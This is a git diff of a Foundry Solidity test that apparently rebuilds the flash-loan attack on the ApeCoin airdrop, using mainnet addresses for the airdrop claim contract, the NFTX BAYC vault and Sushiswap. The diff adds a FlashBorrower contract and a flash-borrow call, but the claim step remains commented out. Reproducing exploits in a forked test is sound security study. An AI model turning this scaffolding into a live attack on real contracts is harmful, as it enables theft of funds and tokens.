@@ -1,6 +1,8 @@
 // SPDX-License-Identifier: UNLICENSED
-pragma solidity ^0.8.13;
+pragma solidity ^0.8.0;
 
+import "../src/IERC20Upgradeable.sol";
+import "../src/Contract.sol";
 import "forge-std/Test.sol";
 import "forge-std/Vm.sol";
 import "forge-std/console.sol";
@@ -102,25 +104,7 @@ interface IUniswapV2Pair {
 //     function approve(address,uint) external returns (bool);
 //     function transfer(address,uint) external returns (bool);
 // }
-interface IERC3156FlashBorrower {
 
-    /**
-     * @dev Receive a flash loan.
-     
-     * @param token The loan currency.
-     * @param amount The amount of tokens lent.
-     * @param fee The additional amount of tokens to repay.
-     * @param data Arbitrary data structure, intended to contain user-defined parameters.
-     * @return The keccak256 hash of "ERC3156FlashBorrower.onFlashLoan"
-     */
-    function onFlashLoan(
-        IERC3156FlashBorrower receiver,
-        address token,
-        uint256 amount,
-        uint256 fee,
-        bytes calldata data
-    ) external returns (bytes32);
-}
 
 // interface nftxvault {
 //     function flashloan(address,address,uint,bytes memory ) external ;
@@ -136,6 +120,7 @@ interface Sushiswap{
 
 contract ContractTest is Test {
     nftxvault vault;
+    FlashBorrower flashborrower;
 
     AirdropGrapesToken airdropclaimcontract;  
     Sushiswap sushi;  
@@ -148,32 +133,21 @@ contract ContractTest is Test {
         airdropclaimcontract = AirdropGrapesToken(0x025C6da5BD0e6A5dd1350fda9e3B6a614B205a1F);
         vault = nftxvault(0xEA47B64e1BFCCb773A0420247C0aa0a3C1D2E5C5);
         sushi = Sushiswap(0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F);
-       
-        // amounts = UniswapV2Library.getAmountsIn(0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac,1e18,path);
-        // console.log("INPUT amount",amounts[0]);
+        flashborrower = new FlashBorrower();
    
         address[] memory path = new address[](2);
         path[0]= 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
         path[1]= 0xEA47B64e1BFCCb773A0420247C0aa0a3C1D2E5C5;
         uint[] memory amounts= new uint[](2);
         IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2).approve(0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F,100000000000000000000);
-        vm.deal(BoredApeowner,100000000000000000000);
-        vm.prank(BoredApeowner);
-        sushi.swapETHForExactTokens{value: 40000000000000000000}(200000000000000000,path,BoredApeowner,block.timestamp + 100);
-        console.log(IERC20(0xEA47B64e1BFCCb773A0420247C0aa0a3C1D2E5C5).balanceOf(address(BoredApeowner)));  
-        // sushi.swapETHForExactTokens{value: 50000000000000000000}(200000000000000000,path,address(this),block.timestamp + 100);
-        // sushi.swapETHForExactTokens{value: 40000000000000000000}(200000000000000000,path,address(this),block.timestamp + 100);
-        // sushi.swapETHForExactTokens{value: 50000000000000000000}(200000000000000000,path,address(this),block.timestamp + 100
-       
-        IERC20(0xEA47B64e1BFCCb773A0420247C0aa0a3C1D2E5C5).approve(0xEA47B64e1BFCCb773A0420247C0aa0a3C1D2E5C5,100000000000000000000000000);
-        vm.prank(BoredApeowner);
-        IERC20(0xEA47B64e1BFCCb773A0420247C0aa0a3C1D2E5C5).transfer(address(this),200000000000000000);
+        vm.deal(address(BoredApeowner),50000000000000000000);
+        vm.prank(address(BoredApeowner));
+        uint[] memory amount  = UniswapV2Library.getAmountsIn(0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac,200000000000000000,path);
+        sushi.swapETHForExactTokens{value: amount[0] }(200000000000000000,path,address((BoredApeowner)),block.timestamp + 100);
         uint bal = IERC20(0xEA47B64e1BFCCb773A0420247C0aa0a3C1D2E5C5).balanceOf(address(this));
         console.log("balance of BAYC tokens sushi swap",bal);
-        
-        uint amountapproved = vault.allowance(address(this),address(vault));
-        console.log("Amount approved to vault by our bot",amountapproved);
-
+        vm.prank(address(BoredApeowner));
+        IERC20(0xEA47B64e1BFCCb773A0420247C0aa0a3C1D2E5C5).transfer(address(flashborrower),200000000000000000);
     }
 
 
@@ -184,21 +158,9 @@ contract ContractTest is Test {
         // vm.prank(BoredApeowner);
         // airdropclaimcontract.claimTokens();
         // console.log(IERC20(apecoin).balanceOf(BoredApeowner));
-   
-        bytes memory data = "0";
-        vm.label(address(vault),"vault");
-        vault.flashloan(address(this),address(vault),200000000000000000,data); 
+        vm.label(address(flashborrower),"botcontract");
+       flashborrower.flashBorrow(address(vault),address(vault),10000000000000000000);
     }
     
-    function onFlashLoan(
-       IERC3156FlashBorrower receiver,
-        address token,
-        uint256 amount,
-        bytes calldata data
-    ) external returns (bytes32){
-        
-        uint bal= IERC20(token).balanceOf(address(this));
-        console.log(bal);
-        return RETURN_VALUE;
-    }
+   
 }
